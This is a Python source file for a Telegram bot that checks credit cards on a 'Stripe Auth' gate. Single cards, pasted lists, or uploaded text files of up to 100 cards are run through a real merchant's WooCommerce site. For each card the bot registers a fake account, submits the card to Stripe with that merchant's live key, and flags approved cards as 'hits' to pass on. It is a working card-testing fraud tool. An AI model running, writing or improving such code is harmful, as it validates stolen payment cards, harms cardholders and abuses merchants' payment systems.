import time
import asyncio
import re
import os
import json
import random
import string
import httpx
from pyrogram import Client, filters, enums
from FUNC.usersdb_func import *
from FUNC.defs import *
from TOOLS.check_all_func import *
from TOOLS.getbin import *
from BOT.tools.hit_stealer import send_hit_if_approved

# Configuration
GATE_NAME = "Stripe Auth $0"
SITE_URL = "https://redbluechair.com"
API_URL = "https://api.stripe.com/v1/payment_methods"
STRIPE_KEY = "pk_live_51ETDmyFuiXB5oUVxaIafkGPnwuNcBxr1pXVhvLJ4BrWuiqfG6SldjatOGLQhuqXnDmgqwRA7tDoSFlbY4wFji7KR0079TvtxNs"
STRIPE_ACCOUNT = "acct_1Mpulb2El1QixccJ"

# Limits
MAX_MSC_LIMIT = 10
MAX_TSC_LIMIT = 100

def generate_email(domain=None, username_length=8):
    """Generate random email"""
    common_domains = [
        "gmail.com", "yahoo.com", "hotmail.com", "outlook.com",
        "protonmail.com", "icloud.com", "aol.com", "live.com"
    ]
    username_characters = string.ascii_lowercase + string.digits
    username = ''.join(random.choice(username_characters) for _ in range(username_length))
    if domain is None:
        domain = random.choice(common_domains)
    email = f"{username}@{domain}"
    return email    

def generate_password(length=12):
    """Generate random password"""
    characters = string.ascii_lowercase + string.ascii_uppercase + string.digits + "!@#$%^&*()"
    password = ''.join(random.choice(characters) for _ in range(length))
    return password

def parseX(data, start, end):
    """Extract data between two strings"""
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]
    except ValueError:
        return "None"

async def call_stripe_auth_api(fullcc, session=None):
    """Call Stripe Auth API to check credit card"""
    try:
        n = fullcc.split('|')[0]
        mm = fullcc.split('|')[1]
        yy = fullcc.split('|')[2][-2:]
        cvc = fullcc.split('|')[3]
        
        # Create new session if not provided
        if session is None:
            session = httpx.AsyncClient(timeout=60, follow_redirects=True)
        
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.8',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '"Brave";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
        }
        
        # Get registration nonce
        response = await session.get(f'{SITE_URL}/my-account/', headers=headers)
        register_nonce = parseX(response.text, 'name="woocommerce-register-nonce" value="', '"')
        
        # Register account
        headers['content-type'] = 'application/x-www-form-urlencoded'
        headers['origin'] = SITE_URL
        headers['referer'] = f'{SITE_URL}/my-account/'
        
        data = {
            'email': generate_email(),
            'password': generate_password(),
            'woocommerce-register-nonce': register_nonce,
            '_wp_http_referer': '/my-account/',
            'register': 'Register',
        }
        
        response = await session.post(f'{SITE_URL}/my-account/', headers=headers, data=data)
        
        # Get payment method page
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.8',
            'referer': f'{SITE_URL}/my-account/payment-methods/',
            'sec-ch-ua': '"Brave";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
        }
        
        response = await session.get(f'{SITE_URL}/my-account/add-payment-method/', headers=headers)
        method_nonce = parseX(response.text, 'name="woocommerce-add-payment-method-nonce" value="', '"')
        intent_nonce = parseX(response.text, '"createSetupIntentNonce":"', '"')
        
        # Create payment method with Stripe
        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Brave";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
        }
        
        data = f'billing_details[name]=+&billing_details[email]={generate_email()}&billing_details[address][country]=US&billing_details[address][postal_code]=10080&type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&pasted_fields=number&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+payment-element%3B+deferred-intent&referrer={SITE_URL}&time_on_page=67040&client_attribution_metadata[client_session_id]=779e4fea-bb16-4f64-9b63-8b6016b302c6&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=35de27e3-14f9-4657-9d14-2de5d6574bc9&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=eb69d6da-71d9-4c0b-b3ac-c78cacc8554ace1414&muid=7e1c3a72-1ca0-4913-bea1-1e1a905fd25ee5fd1b&sid=a8c2b37d-1212-431d-8ff9-05cd04b7dcd95436eb&key={STRIPE_KEY}&_stripe_account={STRIPE_ACCOUNT}'
        
        response = await session.post(API_URL, headers=headers, data=data)
        result_json = response.json()
        
        if "id" in result_json:
            payment_method_id = result_json["id"]
            
            # Confirm setup intent
            files = {
                'action': (None, 'create_setup_intent'),
                'wcpay-payment-method': (None, payment_method_id),
                '_ajax_nonce': (None, intent_nonce),
            }
            
            response = await session.post(f'{SITE_URL}/wp-admin/admin-ajax.php', files=files)
            final_result = response.json()
            
            if final_result.get("success"):
                return "Approved ✓", "Stripe Auth Success", GATE_NAME, "0.00s"
            else:
                error_msg = final_result.get('data', {}).get('error', {}).get('message', 'Unknown error')
                if "insufficient_funds" in error_msg.lower():
                    return "Approved ✓", "Auth Only - No Funds", GATE_NAME, "0.00s"
                else:
                    return "Declined ✗", error_msg[:30], GATE_NAME, "0.00s"
        else:
            error = result_json.get("error", {}).get("message", "Invalid card")
            return "Declined ✗", error[:30], GATE_NAME, "0.00s"
            
    except Exception as e:
        return "Error", str(e)[:30], GATE_NAME, "0.00s"

def extract_cards(text):
    """Extract credit card patterns from text"""
    pattern = r"\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}"
    return re.findall(pattern, text)

# --- SINGLE CHECK COMMAND (/sauth) ---
@Client.on_message(filters.command("sauth", [".", "/"]))
async def stripe_auth_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(Client, message)
        
        if checkall[0] == False:
            return
        role = checkall[1]
        
        getcc = await getmessage(message)
        
        if getcc == False:
            resp = f"""✦ <b>ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ</b> ✦
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}
◈ <b>ᴄᴍᴅ :</b> /sauth

⟢ ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ ɪɴ ʏᴏᴜʀ ɪɴᴘᴜᴛ ✗

↪ <b>ᴜꜱᴀɢᴇ :</b> /sauth cc|mm|yyyy|cvv
━━━━━━━━━━━━━━━━━━━━"""
            await message.reply_text(resp, quote=True, parse_mode=enums.ParseMode.HTML)
            return
            
        cc, mes, ano, cvv = getcc[0], getcc[1], getcc[2], getcc[3]
        fullcc = f"{cc}|{mes}|{ano}|{cvv}"
        gateway = GATE_NAME
        
        firstresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ. ✧

💠 𝘾𝙘-» <code>{fullcc}</code>
💠 𝙂𝙖𝙩𝙚-» <i>{gateway}</i>
💠 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚-» ■□□□"""
        await asyncio.sleep(0.5)
        firstchk = await message.reply_text(firstresp, quote=True, parse_mode=enums.ParseMode.HTML)

        secondresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ.. ✧

💠 𝘾𝙘-» <code>{fullcc}</code>
💠 𝙂𝙖𝙩𝙚-» <i>{gateway}</i>
💠 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚-» ■■■□"""
        await asyncio.sleep(0.5)
        secondchk = await Client.edit_message_text(message.chat.id, firstchk.id, secondresp, parse_mode=enums.ParseMode.HTML)

        start = time.perf_counter()
        status, response, gateway, time_taken = await call_stripe_auth_api(fullcc)
        
        getbin = await get_bin_details(cc)
        brand, type_, level, bank, country, flag, currency = getbin[0], getbin[1], getbin[2], getbin[3], getbin[4], getbin[5], getbin[6]

        thirdresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ... ✧

💠 𝘾𝙘-» <code>{fullcc}</code>
💠 𝙂𝙖𝙩𝙚-» <i>{gateway}</i>
💠 𝙍𝙚𝙨𝙥𝙤ɴꜱᴇ-» ■■■■"""
        await asyncio.sleep(0.5)
        thirdcheck = await Client.edit_message_text(message.chat.id, secondchk.id, thirdresp, parse_mode=enums.ParseMode.HTML)

        finalresp = f"""💠 𝘾𝙘-» <code>{fullcc}</code>
💠 𝙎𝙩𝙖𝙩ᴜꜱ-» {status}
💠 𝙍ᴇꜱᴜʟᴛ-» {response} 💎
════『 INFO 』════
<blockquote expandable>💠 𝘾ᴏᴜɴᴛʀʏ-» {country} {flag}
💠 𝘽ɪɴ-» {brand}_{type_}-{level}
💠 𝘽ᴀɴᴋ-» {bank}</blockquote>
════『 META 』════
💠 𝙂ᴀᴛᴇᴡᴀʏ -» {gateway}
💠 𝙏ɪᴍᴇ-» {time.perf_counter() - start:.2f}s
💠 𝘾ʜᴇᴄᴋᴇᴅ ʙʏ-» <a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a> ↯
{role}
════『 OWNER 』════
      <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
        
        await Client.edit_message_text(message.chat.id, thirdcheck.id, finalresp, disable_web_page_preview=True, parse_mode=enums.ParseMode.HTML)
        
        await setantispamtime(user_id)
        await deductcredit(user_id)
        if "Approved" in status:
            await send_hit_if_approved(Client, finalresp)
    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# --- MASS TEXT/REPLY COMMAND (/msauth) ---
@Client.on_message(filters.command("msauth", [".", "/"]))
async def stripe_auth_mass_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(Client, message)
        if not checkall[0]: 
            return
        role = checkall[1]

        ccs = []
        if message.reply_to_message:
            reply_text = message.reply_to_message.text or message.reply_to_message.caption or ""
            ccs = extract_cards(reply_text)
        else:
            text_parts = message.text.split(maxsplit=1)
            if len(text_parts) > 1:
                ccs = extract_cards(text_parts[1])

        if not ccs:
            resp = f"""✦ <b>ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ</b> ✦
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}
◈ <b>ᴄᴍᴅ :</b> /msauth

⟢ ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ ɪɴ ʏᴏᴜʀ ɪɴᴘᴜᴛ ✗

↪ <b>ᴜꜱᴀɢᴇ :</b> Reply to cards or /msauth cc|mm|yyyy|cvv (up to {MAX_MSC_LIMIT})
━━━━━━━━━━━━━━━━━━━━"""
            await message.reply_text(resp, quote=True, parse_mode=enums.ParseMode.HTML)
            return

        if len(ccs) > MAX_MSC_LIMIT:
            await message.reply(f"✦ ᴏɴʟʏ ꜰɪʀꜱᴛ {MAX_MSC_LIMIT} ᴄᴀʀᴅꜱ ᴡɪʟʟ ʙᴇ ᴘʀᴏᴄᴇꜱꜱᴇᴅ ✦", quote=True)
            ccs = ccs[:MAX_MSC_LIMIT]

        await process_sequential_check(Client, message, ccs, user_id, first_name, role)
    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# --- TXT FILE COMMAND (/tsauth) ---
@Client.on_message(filters.command("tsauth", [".", "/"]))
async def stripe_auth_txt_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(Client, message)
        if not checkall[0]: 
            return
        role = checkall[1]

        target_message = None
        if message.reply_to_message and message.reply_to_message.document:
            target_message = message.reply_to_message
        elif message.document:
            target_message = message

        if not target_message or not target_message.document.file_name.endswith(".txt"):
            resp = f"""✦ <b>ɴᴏ ꜰɪʟᴇ ꜰᴏᴜɴᴅ</b> ✦
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}
◈ <b>ᴄᴍᴅ :</b> /tsauth

⟢ ᴜᴘʟᴏᴀᴅ ᴀ .ᴛxᴛ ꜰɪʟᴇ ᴏʀ ʀᴇᴘʟʏ ᴛᴏ ᴏɴᴇ (up to {MAX_TSC_LIMIT})
━━━━━━━━━━━━━━━━━━━━"""
            await message.reply_text(resp, quote=True, parse_mode=enums.ParseMode.HTML)
            return

        file_path = await Client.download_media(target_message)
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
            ccs = extract_cards(content)
        os.remove(file_path)

        if not ccs:
            await message.reply("✦ ɴᴏ ᴠᴀʟɪᴅ ᴄᴀʀᴅꜱ ꜰᴏᴜɴᴅ ɪɴ ꜰɪʟᴇ ✗ ✦", quote=True)
            return

        if len(ccs) > MAX_TSC_LIMIT:
            await message.reply(f"✦ ᴏɴʟʏ ꜰɪʀꜱᴛ {MAX_TSC_LIMIT} ᴄᴀʀᴅꜱ ᴡɪʟʟ ʙᴇ ᴘʀᴏᴄᴇꜱꜱᴇᴅ ✦", quote=True)
            ccs = ccs[:MAX_TSC_LIMIT]

        await process_sequential_check(Client, message, ccs, user_id, first_name, role)
    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# --- SEQUENTIAL ONE-BY-ONE PROCESSING LOGIC ---
async def process_sequential_check(Client, message, ccs, user_id, first_name, role):
    """Process multiple cards one by one with live updates"""
    initial_resp = f"""✧ <b>ꜱᴘʏᴅᴇ ━ ᴍᴀꜱꜱ ᴄʜᴇᴄᴋ</b> ✧
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

💠 𝙂𝙖𝙩𝙚 -» {GATE_NAME}
💠 𝘾𝘾 𝘼𝙢𝙤𝙪𝙣𝙩 -» {len(ccs)}
💠 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 -» {first_name}
💠 𝙎𝙩𝙖𝙩𝙪𝙨 -» Processing...
━━━━━━━━━━━━━━━━━━━━"""
    progress_msg = await message.reply(initial_resp, quote=True, parse_mode=enums.ParseMode.HTML)
    
    header_text = f"""✧ <b>ꜱᴘʏᴅᴇ ━ ᴍᴀꜱꜱ ᴄʜᴇᴄᴋ</b> ✧
━━━━━━━━━━━━━━━━━━━━
"""
    final_text = header_text
    start_time = time.perf_counter()
    gateway = GATE_NAME
    
    for fullcc in ccs:
        status, response, gateway, time_taken = await call_stripe_auth_api(fullcc)
        
        cc_num = fullcc.split("|")[0]
        getbin = await get_bin_details(cc_num)
        brand, type_, level, bank, country, flag, currency = getbin[0], getbin[1], getbin[2], getbin[3], getbin[4], getbin[5], getbin[6]
        
        card_resp = f"""💠 𝘾𝙘-» <code>{fullcc}</code>
💠 𝙎𝙩𝙖𝙩ᴜꜱ-» {status}
💠 𝙍ᴇꜱᴜʟᴛ-» {response} 💎
════『 INFO 』════
<blockquote expandable>💠 𝘾ᴏᴜɴᴛʀʏ-» {country} {flag}
💠 𝘽ɪɴ-» {brand}_{type_}-{level}
💠 𝘽ᴀɴᴋ-» {bank}</blockquote>
━━━━━━━━━━━━━━━━━━━━
"""
        final_text += card_resp
        
        try:
            await progress_msg.edit_text(final_text, disable_web_page_preview=True, parse_mode=enums.ParseMode.HTML)
        except Exception:
            pass
        
        await asyncio.sleep(0.5)

    elapsed_time = round(time.perf_counter() - start_time, 2)
    footer = f"""════『 META 』════
💠 𝙂ᴀᴛᴇᴡᴀʏ -» {gateway}
💠 𝙏ɪᴍᴇ-» {elapsed_time}s
💠 𝘾ʜᴇᴄᴋᴇᴅ ʙʏ-» <a href='tg://user?id={user_id}'>{first_name}</a> ↯
{role}
════『 OWNER 』════
      <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
    
    final_text += footer
    await progress_msg.edit_text(final_text, disable_web_page_preview=True, parse_mode=enums.ParseMode.HTML)
    await setantispamtime(user_id)
